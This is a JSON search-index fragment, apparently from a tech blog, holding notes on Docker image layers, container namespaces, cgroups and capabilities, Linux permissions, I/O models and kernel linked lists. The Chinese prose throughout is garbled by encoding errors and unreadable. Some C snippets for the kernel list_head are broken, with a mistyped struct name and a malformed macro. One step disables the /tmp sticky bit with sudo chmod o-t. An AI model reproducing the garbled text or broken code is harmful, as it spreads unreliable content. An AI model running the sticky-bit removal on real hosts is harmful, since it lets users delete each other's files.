\"f07352aa34c241692cae1ce60ade187857d0bffa3a31390867038d46b1e7739c/layer.tar\", // 5 \"46a2fed8167f5d523f9a9c07f17a7cd151412fed437272b517ee4e46587e5557/layer.tar\" // 6 ] } ] ç”±ä¸Šå¯çŸ¥, redis:3.2.11-alpine è¿™ä¸ª image æœ‰ 6 ä¸ª *layer.tar ç»„æˆ. æ¯ä¸€ä¸ª layer.tar å¯¹åº” image ä¸€å±‚.\næŸ¥çœ‹ repositories cat repositories ç»“æœå¦‚ä¸‹:\n{\"redis\":{\"3.2.11-alpine\":\"46a2fed8167f5d523f9a9c07f17a7cd151412fed437272b517ee4e46587e5557\"}} åˆ›å»ºä¸€ä¸ªç©ºçš„ image build an image from scratch\ndocker import --help Usage: docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]] Import the contents from a tarball to create a filesystem image Options: -c, â€“change list Apply Dockerfile instruction to the created image -m, â€“message string Set commit message for imported image\nä½¿ç”¨ docker import ç”Ÿæˆä¸€ä¸ªç©ºé•œåƒ tar cv --files-from /dev/null | docker import - empty ç”Ÿæˆçš„ empty ç©ºé•œåƒ ID å¦‚ä¸‹: sha256:8880ab5b7953a69e0a9252cbeeb537f0667ec10d3f849289117f8434802c0c49\næŸ¥çœ‹ç”Ÿæˆçš„é•œåƒ docker images Creating Image without Dockerfile å¾—åˆ° BusyBox rootfs curl -LO https://raw.githubusercontent.com/moby/moby/a575b0b1384b2ba89b79cbd7e770fbeb616758b3/contrib/mkimage/busybox-static \u0026\u0026 chmod +x busybox-static æ‰§è¡Œ ./busybox-static busybox\nls -lha busybox\nå‘ busybox æ·»åŠ ä¸€ä¸ªç‰ˆæœ¬ä¿¡æ¯\necho KatacodaPrivateBuild \u003e busybox/release ç”¨ busybox è¿™ä¸ªæ–‡ä»¶å¤¹ç”Ÿæˆä¸€ä¸ª image the directory can be converted into a tar and automatically imported into Docker as an image.\ntar -C busybox -c . | docker import - busybox å¯åŠ¨ä¸€ä¸ªå®¹å™¨å¹¶æŸ¥çœ‹ release ä¿¡æ¯ docker run busybox cat /release busy-static shell è„šæœ¬åˆ†æ #!/usr/bin/env bash set -e # Exit immediately if a command exits with a non-zero status. rootfsDir=\"$1\" # $1 æ˜¯ç¬¬ä¸€ä¸ªå‚æ•° shift # ç›¸å½“äº shift 1, ä¹Ÿå°±æ˜¯æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä¸¢æ‰, åé¢çš„éƒ½å‰è¿›ä¸€æ­¥ busybox=\"$(which busybox 2\u003e/dev/null || true)\" # æ‹¿åˆ° busybox çš„è·¯å¾„ if [ -z \"$busybox\" ]; then echo \u003e\u00262 'error: busybox: not found' echo \u003e\u00262 ' install it with your distribution \"busybox-static\" package' exit 1 fi if ! ldd \"$busybox\" 2\u003e\u00261 | grep -q 'not a dynamic executable'; then echo \u003e\u00262 \"error: '$busybox' appears to be a dynamic executable\" echo \u003e\u00262 ' you should install your distribution \"busybox-static\" package instead' exit 1 fi mkdir -p \"$rootfsDir/bin\" # åˆ›å»º $rootfsDir/bin rm -f \"$rootfsDir/bin/busybox\" # just in case cp \"$busybox\" \"$rootfsDir/bin/busybox\" ( cd \"$rootfsDir\" IFS=$'\\n' modules=( $(bin/busybox --list-modules) ) # å¾—åˆ° busybox æ‰€æœ‰çš„æ¨¡å— unset IFS for module in \"${modules[@]}\"; do mkdir -p \"$(dirname \"$module\")\" # ln target linkname ln -sf /bin/busybox \"$module\" # å¼ºåˆ¶åˆ›å»ºç¬¦å·é“¾æ¥ done ) ","references#References":" busybox-static docker-intro "},"title":"katacoda-what-is-a-container-image"},"/blog/katacoda-what-is-a-container/":{"data":{"":"","capabilities#Capabilities":" Capabilities are groupings about what a process or user has permission to do. These Capabilities might cover multiple system calls or actions, such as changing the system time or hostname.\næŸ¥çœ‹ redis-server çš„ Capabilities The status file also containers the Capabilities flag. A process can drop as many Capabilities as possible to ensure itâ€™s secure.\ncat /proc/$DBPID/status | grep ^Cap ç»“æœå¦‚ä¸‹:\nCapInh: 00000000a80425fb CapPrm: 0000000000000000 CapEff: 0000000000000000 CapBnd: 00000000a80425fb CapAmb: 0000000000000000\nè§£æ redis-server çš„ flags The flags are stored as a bitmask that can be decoded with capsh\ncapsh --decode=00000000a80425fb è§£æç»“æœå¦‚ä¸‹:\n0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner, cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap, cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod, cap_audit_write,cap_setfcap","cgroups#CGroups":" CGroups limit the amount of resources a process can consume. These cgroups are values defined in particular files within the /proc directory. CGroups ç”¨æ¥é™åˆ¶ä¸€ä¸ªè¿›ç¨‹å¯ä»¥ä½¿ç”¨çš„èµ„æºçš„é‡. cgroups çš„å€¼è¢«å®šä¹‰åœ¨ /proc æ–‡ä»¶å¤¹ä¸‹çš„ç‰¹å®šæ–‡ä»¶é‡Œ.\næŸ¥çœ‹ redis-server çš„ CGroups cat /proc/$DBPID/cgroup å¾—åˆ° redis-server çš„å®¹å™¨ ID DBID=$(docker ps --no-trunc | grep 'db' | awk '{print $1}') æŸ¥çœ‹ redis-server çš„ cpu stats å’Œ usages cat /sys/fs/cgroup/cpu,cpuacct/docker/$DBID/cpuacct.stat æŸ¥çœ‹ redis-server çš„ cpu shares cat /sys/fs/cgroup/cpu,cpuacct/docker/$DBID/cpu.shares æŸ¥çœ‹æ‰€æœ‰å®¹å™¨çš„ memory çš„ docker cgroups é…ç½® ls /sys/fs/cgroup/memory/docker æŸ¥çœ‹æ‰€æœ‰çš„ CGroups ls /sys/fs/cgroup é…ç½® cgroups ç”¨ cgroups é…ç½® å†…å­˜, memory quotes å­˜æ”¾åœ¨ memory.limit_in_bytes è¿™ä¸ªæ–‡ä»¶\nå®¹å™¨é»˜è®¤æ²¡æœ‰å†…å­˜é™åˆ¶ docker stats db --no-strem ; åªæŸ¥çœ‹ä¸€æ¡ä¿¡æ¯ é™åˆ¶ db è¿™ä¸ªå®¹å™¨çš„å†…å­˜ä½¿ç”¨ echo 8000000 \u003e /sys/fs/cgroup/memory/docker/$DBID/memory.limit_in_bytes ","namespace#namespace":" One of the fundamental parts of a container is namespaces. The concept of namespaces is to limit what processes can see and access certain parts of the system, such as other network interfaces or processes When a container is started, the container runtime, such as Docker, will create new namespaces to sandbox the process. By running a process in itâ€™s own Pid namespace, it will look like itâ€™s the only process on the system.\nMount (mnt) Process (pid) Network (net) Interprocess Communication (ipc) UTS (hostnames) aka unix time-sharing system User ID (user) Control group (cgroup) lanched â€œcontainedâ€ processes Without using a runtime such as Docker, a process can still operate within itâ€™s own namespace. One tool to help is unshare.\nä¸ç”¨ docker è¿™ä¸ª runtime, ä¹Ÿå¯ä»¥ç”¨ unshare è¿™ä¸ªå·¥å…·æ¥åˆ›å»ºä¸€ä¸ªæ‹¥æœ‰è‡ªå·±çš„ namespace çš„è¿›ç¨‹.\nunshare --help Run a program with some namespaces unshared from the parent.\nè¿è¡Œä¸€ä¸ªç¨‹åº, ä¸å…±äº«çˆ¶è¿›ç¨‹çš„æŸäº› namespaces\nunshare --fork --pid --mount-proc bash ps exit namespace æ˜¯å•¥ Namespaces are inode locations on disk. this allows for processes to shared/reused the same namespace, allowing them to view and interact.\nnamespace æ˜¯ç¡¬ç›˜ä¸Šçš„ inode. è¿™å…è®¸ processes å…±äº«/å¤ç”¨ç›¸åŒçš„ namespace, å…è®¸è¿›ç¨‹ä¹‹é—´å¯ä»¥äº’ç›¸çœ‹å¾—åˆ°, äº’ç›¸äº¤æµ.\næŸ¥çœ‹ redis-server çš„æ‰€æœ‰ namespace ls -liha /proc/$DBPID/ns attach process to existing NameSpaces nsenter run a program with namespaces of other processes.\nåœ¨å…¶ä»–è¿›ç¨‹çš„ namespace ä¸­è¿è¡Œä¸€ä¸ªç¨‹åº\nnsenter --help nsenter [options] [\u003cprogram\u003e [\u003cargument\u003e...]] Options: -a, --all enter all namespaces -t, --target \u003cpid\u003e target process to get namespaces from -m, --mount[=\u003cfile\u003e] enter mount namespace -u, --uts[=\u003cfile\u003e] enter UTS namespace (hostname etc) -i, --ipc[=\u003cfile\u003e] enter System V IPC namespace -n, --net[=\u003cfile\u003e] enter network namespace -p, --pid[=\u003cfile\u003e] enter pid namespace -C, --cgroup[=\u003cfile\u003e] enter cgroup namespace -U, --user[=\u003cfile\u003e] enter user namespace -S, --setuid \u003cuid\u003e set uid in entered namespace -G, --setgid \u003cgid\u003e set gid in entered namespace --preserve-credentials do not touch uids or gids -r, --root[=\u003cdir\u003e] set the root directory -w, --wd[=\u003cdir\u003e] set the working directory -F, --no-fork do not fork before exec'ing \u003cprogram\u003e -Z, --follow-context set SELinux context according to --target PID nsenter --target $DBPID --mount --uts --ipc --net --pid ps aux åœ¨ redis-server çš„ mount, uts, ipc, net, pid è¿™äº›å‘½åç©ºé—´é‡Œæ‰§è¡Œ ps å‘½ä»¤\nshare namespaces of redis-server With Docker, these namespaces can be shared using the syntax container:\u003ccontainer-name\u003e. For example, the command below will connect nginx to the DB namespace\ndocker run -d --name=web --net=container:db nginx:alpine å¯åŠ¨ nginx çš„å®¹å™¨. å…±äº« redis-server çš„ net namespace\næŸ¥çœ‹ nginx å®¹å™¨çš„ net çš„ namespace ls -lha /proc/$WEBPID/ns/ | grep net dr-xâ€“xâ€“x 2 systemd-network systemd-journal 0 Dec 24 13:40 . dr-xr-xr-x 9 systemd-network systemd-journal 0 Dec 24 13:40 .. lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 cgroup -\u003e cgroup:[4026531835] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 ipc -\u003e ipc:[4026532225] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 mnt -\u003e mnt:[4026532223] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 net -\u003e net:[4026532160] â€“ æ³¨æ„è¿™ä¸ªæ˜¯å…±äº«çš„ redis-server çš„ net å‘½åç©ºé—´ lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 pid -\u003e pid:[4026532226] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 user -\u003e user:[4026531837] lrwxrwxrwx 1 systemd-network systemd-journal 0 Dec 24 13:40 uts -\u003e uts:[4026532224]\næŸ¥çœ‹ redis-server å®¹å™¨çš„ net å‘½åç©ºé—´ ls -lha /proc/$DBPID/ns/ | grep net lrwxrwxrwx 1 999 packer 0 Dec 24 13:39 net -\u003e net:[4026532160]","process-directory#Process Directory":" Linux is just a series of magic files and contents, this makes it fun to explore and navigate to see what is happening under the covers, and in some cases, change the contents to see the results. The configuration for each process is defined within the /proc directory. If you know the process ID, then you can identify the configuration directory.\næ¯ä¸€ä¸ª process çš„é…ç½®éƒ½å®šä¹‰åœ¨ /proc æ–‡ä»¶å¤¹ä¸‹. å¦‚æœçŸ¥é“ process ID, å°±èƒ½æ‰¾åˆ°è¯¥è¿›ç¨‹çš„é…ç½®æ–‡ä»¶å¤¹\nredis-server è¿›ç¨‹çš„é…ç½® æ‰¾åˆ° redis-server çš„ pid DBPID=$(pgrep redis-server) echo Redis is $DBPID ls /proc æŸ¥çœ‹ redis-server è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ ls /proc/$DBPID cat /proc/$DBPID/environ ç»“æœå¦‚ä¸‹:\nHOSTNAME=f3b9624ce46cSHLVL=2REDIS_DOWNLOAD_SHA= 61db74eabf6801f057fd24b590232f2f337d422280fd19486 eca03be87d3a82bHOME=/home/redisPATH=/usr/local/sb in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-5.0.7.tar.gzREDIS_VERSION=5.0.7PWD=/data\nè§£ææŸ¥çœ‹:\n'HOSTNAME=5fba1658e4ceSHLVL=2REDIS_DOWNLOAD_SHA=61db74eabf6801f057fd24b590232f2f337d422280fd19486eca03be87d3a82bHOME=/home/redisPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binREDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-5.0.7.tar.gzREDIS_VERSION=5.0.7PWD=/data'.match(/[A-Z]+=[^A-Z]*/g) // regexp è§£ææŸ¥çœ‹ key=value docker å®¹å™¨é‡Œæ‰§è¡Œ env å‘½ä»¤ docker exec -it db env env å†…å®¹å¦‚ä¸‹:\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=f3b9624ce46c TERM=xterm REDIS_VERSION=5.0.7 REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-5.0.7.tar.gz REDIS_DOWNLOAD_SHA=61db74eabf6801f057fd24b590232f2f337d422280fd19486eca03be87d3a82b HOME=/root","processes#Processes":" Containers are just normal Linux Processes with additional configuration applied.\nå®¹å™¨åªæ˜¯åº”ç”¨äº†é™„åŠ é…ç½®çš„æ™®é€š Linux è¿›ç¨‹ã€‚\nredis container lanch redis-server process Usage: docker run [OPTIONS] IMAGE [COMMAND] [ARGâ€¦] docker run â€“help -d, â€“detach Run container in background and print container ID â€“name string Assign a name to the container\ndocker run -d --name=db redis:alpine åœ¨åå°å¯åŠ¨ä¸€ä¸ª container name æ˜¯ db çš„å®¹å™¨, å¹¶æ‰“å°å®¹å™¨çš„ ID\nUnable to find image â€˜redis:alpineâ€™ locally alpine: Pulling from library/redis 63bc94deeb28: Pull complete 828e397560e3: Pull complete 5902d88df6c2: Pull complete 157b2c953c6d: Pull complete b5212c16b59d: Pull complete 5f8f01031701: Pull complete Digest: sha256:613ab7e1c0175cae18b69c291512e5e8f1129175f6617ff2126b7ac9a1e5c550 Status: Downloaded newer image for redis:alpine 0a5ceea3df52e200d45772c4507b20d7c95a97dcd3939cb33a8d5bc1b842e334\næ£€éªŒ pidof \u003cprocess-name\u003e pidof redis-server ps ps aux | grep redis-server docker top container-name docker top can help us identify information about the process including the PID (Process ID) and PPID (Parent Process ID)\ndocker top db pstree pstree will list all of the sub processes\npstree -c -p -A $(pgrep dockerd) ","reference#Reference":" what is a container awk ","seccomp-é™åˆ¶å¯ä»¥ä½¿ç”¨çš„-syscall#Seccomp é™åˆ¶å¯ä»¥ä½¿ç”¨çš„ syscall":" When assigned to a process it means the process will be limited to a subset of the ability system calls. If it attempts to call a blocked system call is will recieve the error â€œOperation Not Allowedâ€. å®¹å™¨é»˜è®¤å¯ä»¥ä½¿ç”¨çš„ syscall\ncat /proc/$DBPID/status cat /proc/$DBPID/status | grep Seccomp The flag meaning are: 0: disabled 1: strict 2: filtering"},"title":"katacoda-what-is-a-container"},"/blog/learn-llm/":{"data":{"post-training#post-training":"å¯¹è¯é›†ç»“æ„ â€”\u003e ä¸€ç»´ token åºåˆ— instruct-gpt\nå¼ºåŒ–å­¦ä¹  reinforcement learning ç›‘ç£å­¦ä¹  supervised earning supervised-fine-tuning","pre-training#pre-training":"pre-traininghttps://huggingface.co/spaces/HuggingFaceFW/blogpost-fineweb-v1\n100000 symbols(tokens) raw text â€”\u003etokenization â€”\u003e token","references#References":" è§†é¢‘è®²è§£ https://tiktokenizer.vercel.app/ https://bbycroft.net/llm https://hyperbolic.xyz/ å¯¹è¯æ•°æ®é›† äº’è”ç½‘æ•°æ®é›† ","statistic-token-simulator#statistic token simulator":"è¿™å°±æ˜¯æ‰€è°“çš„ prediction\nå‚æ•° å„ä¸ª token çš„æƒé‡\næ¨¡å‹æœ‰å¤§é‡çš„çŸ¥è¯†ï¼Œå­˜å‚¨åœ¨ä¸Šäº¿çš„å‚æ•°ä¹‹ä¸­ã€‚è¿™äº›å‚æ•°å¯ä»¥è§†ä¸ºå¯¹è¶…å¤§è§„æ¨¡çš„çŸ¥è¯†è¿›è¡Œçš„ä¸€ç§æœ‰æŸå‹ç¼©ã€‚è¶…å¤§è§„æ¨¡çŸ¥è¯†çš„æ¨¡ç³Šè®°å¿†ã€‚\næŒ‰ç…§ç»Ÿè®¡è§„å¾‹ç»™å‡ºæ‰€è°“çš„ç­”æ¡ˆ\næ¨¡å‹éœ€è¦ä¸­é—´ç»“æœ\næ¦‚ç‡ã€ç»Ÿè®¡\nin-context learning","tokenization#tokenization":"https://tiktokenizer.vercel.app/?model=cl100k_base"},"title":"Learn Llm"},"/blog/linux-file-permissions/":{"data":{"references#References":" how-do-i-set-up-setuid-setgid-and-sticky-bits-on-linux/ understanding-linux-file-permissions what-is-sticky-bit-permission-and-how-to-use-it basic-file-permissions https://wiki.archlinux.org/title/File_permissions_and_attributes etc-shadow-file crontab useradd ","setgid#setgid":"ä½œç”¨äº file setgid ä½œç”¨äºæ–‡ä»¶å’Œ setuid æ‰€èµ·ä½œç”¨ç±»ä¼¼ã€‚\nä½œç”¨äº directory åœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºçš„æ–‡ä»¶æˆ–è€…ç›®å½•ç»§æ‰¿è¯¥ç›®å½•çš„ groupã€‚","setuid#setuid":" Setuid is a Linux file permission setting that allows a user to execute that file or program with the permission of the owner of that file. å¾ˆæ˜æ˜¾ï¼Œsetuid è¿™ä¸ªæƒé™è¦å’Œ execute æƒé™ä¸€èµ·ä½¿ç”¨ï¼Œä½œç”¨äºå¯æ‰§è¡Œæ–‡ä»¶ã€‚\nä»¥ passwd è¿™ä¸ªå‘½ä»¤ä¸ºä¾‹ï¼š\nstardust@os:bin$ ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 68208 Jul 15 2021 /usr/bin/passwd stardust@os:bin$ stat $(which passwd) File: /usr/bin/passwd Size: 68208 Blocks: 136 IO Block: 4096 regular file Device: 812h/2066d Inode: 659228 Links: 1 Access: (4755/-rwsr-xr-x) Uid: ( 0/ root) Gid: ( 0/ root) Access: 2022-04-16 20:28:18.403355543 +0800 Modify: 2021-07-15 06:08:18.000000000 +0800 Change: 2021-10-30 22:33:09.394547633 +0800 Birth: - å¯ä»¥çœ‹åˆ° passwd è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™æ˜¯ rwsr-xr-x ä¹Ÿå°±æ˜¯ 4755ï¼Œè¿™æ‰æ˜¯å®Œæ•´çš„æƒé™ã€‚ rws ä¸­ s è¡¨æ˜ user ç»„çš„æƒé™ä¸­å¯ç”¨äº† setuidã€‚s è¡¨æ˜ execute + setuidã€‚ æŸ¥çœ‹ man passwd å¾—çŸ¥ user çš„å¯†ç ä»¥åŠå¯†ç ç›¸å…³ä¿¡æ¯ä¿å­˜åœ¨ /etc/shadow ä¸­ï¼Œä½†æ˜¯ /etc/shadow çš„æƒé™æ˜¯:\nstardust@os:~$ ls -l /etc/shadow -rw-r----- 1 root shadow 1669 Mar 31 23:08 /etc/shadow å¯ä»¥çœ‹åˆ° /etc/shadow åªå…è®¸ root ç”¨æˆ·è¿›è¡Œä¿®æ”¹ã€‚ä½†æ˜¯æ‰§è¡Œ passwd å´å¯ä»¥ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ å› ä¸º passwd user æƒé™å¯ç”¨äº† setuidï¼Œå¹¶ä¸” passwd è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„ owner æ˜¯ rootï¼Œè¿™å°±æ˜¯ setuid çš„ä½œç”¨äº†ã€‚ ç”±äº passwd å¯ç”¨äº† setuidï¼Œæ™®é€šç”¨æˆ·ï¼Œå¦‚ stardust è¿™ä¸ªç”¨æˆ·åœ¨æ‰§è¡Œ passwd è¿™ä¸ªç¨‹åºæ—¶ï¼Œä¼šä»¥ root ç”¨æˆ·, è€Œä¸æ˜¯ä»¥ stardust è¿™ä¸ªç”¨æˆ·è¿è¡Œç¨‹åºï¼Œæ‰€ä»¥ stardust æ‰§è¡Œ passwd æ˜¯å¯ä»¥ä¿®æ”¹ /etc/shadow è¿™ä¸ªæ–‡ä»¶çš„ã€‚\n# 1. æŸ¥çœ‹ passwd å¯ç”¨äº† setuid stardust@os:~$ ls -l /usr/bin/passwd -rwsr-xr-x 1 root root 68208 Jul 15 2021 /usr/bin/passwd # 2. ä¿®æ”¹ stardust å¯†ç  stardust@os:~$ passwd stardust Changing password for stardust. Current password: # å¦å¤–ä¸€ä¸ªç»ˆç«¯æŸ¥çœ‹ stardust@os:Namespaces$ ps -ef | grep passwd root 299906 299450 0 12:03 pts/5 00:00:00 passwd stardust # 3. å¯ä»¥çœ‹å‡º passwd stardust æ˜¯ä»¥ root ç”¨æˆ·æ‰§è¡Œçš„ stardust 300029 299940 0 12:03 pts/6 00:00:00 grep --color=auto passwd å¼€å¯ setuid æƒé™ç»å¸¸ä½¿ç”¨çš„å‘½ä»¤è¿˜æœ‰ sudoã€‚\nstardust@os:~$ ls -al /usr/bin/sudo -rwsr-xr-x 1 root root 166056 Jan 19 2021 /usr/bin/sudo ","sticky-bit#sticky-bit":" When sticky bit is set on a directory, the files in that directory can only be removed by the owner. A typical use of this is /tmp/ The /tmp directory can be written to by any user, but other users cannot delete the files of others.\n/tmp é»˜è®¤å¼€å¯äº† sticky bit stardust@os:tmp$ ls -ld /tmp drwxrwxrwt 25 root root 4096 Apr 17 18:22 /tmp stardust@os:tmp$ mkdir -v stardust-sticky mkdir: created directory 'stardust-sticky' stardust@os:tmp$ ls -ld stardust-sticky/ drwxrwxr-x 2 stardust stardust 4096 Apr 17 18:22 stardust-sticky/ stardust@os:tmp$ su test Password: $ id uid=1002(test) gid=1002(test) groups=1002(test),1000(stardust) $ rm -rf /tmp/stardust-sticky rm: cannot remove '/tmp/stardust-sticky': Operation not permitted # test è¿™ä¸ª user æ— æ³•åˆ é™¤ /tmp/stardust-sticky è¿™ä¸ª directory çš„ã€‚ /tmp å…³é—­ sticky-bit stardust@os:tmp$ sudo chmod o-t /tmp # å…³é—­ /tmp è¿™ä¸ªç›®å½•çš„ sticky bit stardust@os:tmp$ ls -ld /tmp drwxrwxrwx 25 root root 4096 Apr 17 18:22 /tmp stardust@os:tmp$ su test Password: $ rm -rf /tmp/stardust-sticky # test è¿™ä¸ª user å¯ä»¥æˆåŠŸåˆ é™¤ stardust è¿™ä¸ªç”¨æˆ·çš„ /tmp/stardust-sticky ç›®å½• $ exit stardust@os:tmp$ ls -ld stardust-sticky ls: cannot access 'stardust-sticky': No such file or directory ","æƒé™åˆ—è¡¨#æƒé™åˆ—è¡¨":" æœ€è¿‘åœ¨ä½¿ç”¨ k8s è¿‡ç¨‹ä¸­ï¼Œéœ€è¦ç»™ mount çš„æ–‡ä»¶é…ç½®æƒé™ã€‚ æèµ· file çš„æƒé™åªæƒ³åˆ° rwxï¼Œæ˜¯ä¸å…¨é¢çš„,å®Œæ•´çš„æƒé™æ˜¯ rwxsStTã€‚\næƒé™åˆ—è¡¨","æƒé™å¯¼å›¾#æƒé™å¯¼å›¾":"","ç‰¹æ®Šæƒé™#ç‰¹æ®Šæƒé™":""},"title":"Linux File Permissions"},"/blog/linux-io-model/":{"data":{"":"","io-æ¨¡å‹#I/O æ¨¡å‹":"Blocking I/O Non-blocking I/O I/O Multiplexing Signal-Driven I/O Asynchronous I/O ","references#References":" å†…æ ¸è§’åº¦çœ‹ I/O æ¨¡å‹-å¼ºçƒˆæ¨è syscall åˆ†ç±» ","ç”¨æˆ·ç©ºé—´è·å–æ•°æ®å‰ææ˜¯ä»€ä¹ˆ#ç”¨æˆ·ç©ºé—´è·å–æ•°æ®å‰ææ˜¯ä»€ä¹ˆ?":" æ•°æ®å‡†å¤‡é˜¶æ®µ å†…æ ¸å‡†å¤‡æ•°æ®ï¼Œè¿™å°±å¼•å‡ºäº†é—®é¢˜ï¼Œå†…æ ¸è¿˜æ²¡å‡†å¤‡å¥½æ•°æ®ï¼Œç­‰(sleep)è¿˜æ˜¯ä¸ç­‰ï¼Ÿ æ¯”å¦‚å†…æ ¸ sock çš„ sk_receive_queue æ²¡æœ‰æ•°æ® å†…æ ¸æ²¡å‡†å¤‡å¥½æ•°æ®ï¼Œè¿›ç¨‹è¿›å…¥ sleep çŠ¶æ€ -\u003e é˜»å¡ IO å†…æ ¸æ²¡å‡†å¤‡å¥½æ•°æ®ï¼Œè¿›ç¨‹ä¸è¿›å…¥ sleep çŠ¶æ€ -\u003e éé˜»å¡ IO æ•°æ®æ‹·è´é˜¶æ®µ æ•°æ®ä»å†…æ ¸ç©ºé—´å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œè¿™å°±å¼•å‡ºäº†é—®é¢˜ï¼Œè°æ¥è´Ÿè´£å¤åˆ¶? æ¯”å¦‚å†…æ ¸ sock çš„ sk_receive_queue çš„æ•°æ®ç”±è°æ¥å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ ç”±ç”¨æˆ·çº¿ç¨‹çš„å†…æ ¸æ€æ¥è´Ÿè´£ -\u003e åŒæ­¥ IO ç”±å†…æ ¸çº¿ç¨‹è´Ÿè´£ -\u003e å¼‚æ­¥ IO æ ¹æ®ä»¥ä¸Šä¸¤å¤§é˜¶æ®µç†è§£ block/non-block sync/async "},"title":"Linux Io Model"},"/blog/linux-kernel-analysis-1/":{"data":{"analysis01#analysis01":"analysis01","linux-kernel#Linux Kernel":"åŒé“¾è¡¨ ç»“æ„ struct list_head{ struct list_head *next , *prev }; è¿™ä¸ªç»“æ„å¾ˆæœ‰æ„æ€, æ”¹å˜ä¸¤ä¸ªæŒ‡é’ˆçš„å«ä¹‰, ä¼šå‘ç°å‡ ä¹æè¿°äº†å¾ˆå¤šæ•°æ®ç»“æ„. åªæœ‰ä¸€ä¸ª *next, å•é“¾è¡¨, åªè¿›è¡Œå¤´éƒ¨æ’å…¥æ•°æ®-æ ˆ, åªè¿›è¡Œå°¾éƒ¨æ’å…¥æ•°æ®-é˜Ÿåˆ— *left, *right\nåˆå§‹åŒ– define LIST_HEAD_INIT(name){\u0026name, \u0026name} å‰åæŒ‡é’ˆéƒ½æŒ‡å‘è‡ªå·±\nå£°æ˜å¹¶åˆå§‹åŒ– define LIST_HEAD(name) struct list_head(name){LIST_HEAD_INIT(name)} åˆ¤ç©º static inline int list_empty(const struct list_head*head){ return head-\u003enext == head; } æ·»åŠ èŠ‚ç‚¹ static inline void _ _list_add(struct list_head*new,struct list_head*prev,struct_head*next){ next-\u003eprev = new; new-\u003enext = next; new-\u003eprev = prev; prev-\u003enext = new; } static è¯¥å‡½æ•°ä½œç”¨åŸŸä»…åœ¨æœ¬æ–‡ä»¶å†…, å¯ä»¥éšè—ä¿¡æ¯ inline ç¼–è¯‘å™¨å±•å¼€è¯¥å‡½æ•°\nstatic inline void _ _list_add_tail(struct list_head*new,struct list_head*head){ _ _list_add(new,head-\u003eprev,head); } ","å†…æ ¸ç±»å‹#å†…æ ¸ç±»å‹":" å•å†…æ ¸ (Linux) å¯åŠ è½½çš„ Linux å†…æ ¸æ¨¡å—, æé«˜ç»´æŠ¤æ€§.\nå¾®å†…æ ¸ ","è®¾è®¡ç†å¿µ#è®¾è®¡ç†å¿µ":"æœºåˆ¶ä¸ç­–ç•¥åˆ†ç¦» æœºåˆ¶ â€“ æä¾›ä»€ä¹ˆæ ·çš„åŠŸèƒ½ ç­–ç•¥ â€“ å¦‚ä½•ä½¿ç”¨è¿™äº›åŠŸèƒ½\nè¯´å®åœ¨çš„è¿™å¥è¯ç¬¬ä¸€æ¬¡å¬åˆ°è¿˜æ˜¯æŒºéœ‡æ’¼çš„, ä¸€æ—¶è§‰å¾—å¤§å­¦é‡Œçš„æ“ä½œç³»ç»Ÿéƒ½ä¸çŸ¥é“åœ¨å¹²å˜›, æˆ‘ä»¬å­¦çš„å°±æ˜¯æœºåˆ¶, æ¯”å¦‚è¿›ç¨‹åˆ›å»ºåŠŸèƒ½, è¿›ç¨‹åˆ›å»ºå®Œæˆåå…·ä½“å¦‚ä½•ä½¿ç”¨ä¸OSå†…æ ¸ä¸å†æœ‰å…³. æ–‡ä»¶åˆ›å»ºåŠŸèƒ½, æ–‡ä»¶åˆ›å»ºå®Œ,å¦‚ä½•ä½¿ç”¨äº¤ç»™ç”¨æˆ·. å…¶å®å¾ˆç±»ä¼¼ç¼–ç¨‹ä¸­çš„æ¥å£, æ¥å£å®šä¹‰åŠŸèƒ½, å®ç°è´Ÿè´£å…·ä½“çš„ç­–ç•¥."},"title":"linux-kernel-analysis-1"},"/blog/linux-kernel-analysis-2/":{"data":{"æ•°æ®è¿ç»­å­˜å‚¨å’Œé€‰æ‹©è¯»å–#æ•°æ®è¿ç»­å­˜å‚¨å’Œé€‰æ‹©è¯»å–":"æ•°æ®è¿ç»­å­˜å‚¨å’Œé€‰æ‹©è¯»å–"},"title":"linux-kernel-analysis-2"},"/blog/linux-process-state/":{"data":{"":"","key-signals-affecting-process-state#Key Signals Affecting Process State":"â€¢ SIGSTOP: Forcefully stops a process.\nâ€¢ SIGCONT: Resumes a stopped process.\nâ€¢ SIGTERM: Requests graceful termination.\nâ€¢ SIGKILL: Forcefully kills a process.","process-state#process state":"Running/Runnable(R) ä¸‡äº‹ä¿±å¤‡ï¼Œåªéœ€è¦è¢« scheduler è°ƒåº¦åˆ° CPU ä¸Šå»è¿è¡Œã€‚\nInterruptable Sleep(S) å¤„äºè¿™ä¸ªçŠ¶æ€çš„ä¸ä¼šè¢« scheduler è°ƒåº¦åˆ° CPU ä¸Šå»è¿è¡Œã€‚\nd_state.c code d_state.c#include \u003cunistd.h\u003e int main(){ pause(); } gcc -o d_state d_state.c ./d_state ps aux | grep d_state Uninterruptible Sleep(D) å¯èƒ½æ˜¯ Disk Sleep çš„åŸå› ã€‚çŠ¶æ€ç”¨ D è¡¨ç¤ºã€‚\nStopped(T) 